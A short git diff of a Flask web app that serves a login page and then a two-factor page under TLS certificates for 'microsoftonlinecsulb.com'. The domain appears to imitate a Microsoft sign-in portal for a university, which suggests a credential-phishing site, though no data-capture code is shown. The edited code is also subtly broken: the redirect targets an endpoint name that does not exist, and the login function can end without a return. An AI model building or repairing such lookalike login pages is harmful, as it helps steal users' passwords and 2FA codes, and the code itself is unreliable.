@@ -24,9 +24,6 @@ context = ('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem', '/etc/lets
 def profile():
     return 'Profile'
 
-@app.route("/")
-def change_it():
-    return render_template("index.html")
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -41,14 +38,16 @@ def login():
     if var == True:
         #stop loading
         print("its true")
-        return render_template('2fa.html')
+        return redirect(url_for('2fa'))
         
 
     
     # if request.method == "POST":
     #     todo = request.form.get("todo")
     #     print(todo)
-    return render_template('2fa.html')
+@app.route('/2fa')
+def foo():
+    return render_template("2fa.html")
 
 @app.route("/")
 def home():
